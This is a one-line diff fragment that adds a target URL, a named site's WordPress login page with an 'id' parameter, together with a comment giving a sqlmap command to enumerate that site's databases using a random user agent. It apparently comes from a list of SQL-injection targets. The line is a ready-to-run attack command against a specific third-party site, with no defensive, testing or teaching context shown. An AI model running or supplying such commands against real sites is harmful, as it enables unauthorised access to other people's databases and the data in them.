@@ -1,0 +1,1 @@
+https://saitaxi.com/wp-login.php?id=1 (GET)  # sqlmap.py -u https://saitaxi.com/wp-login.php?id=1 -dbs --random-agent
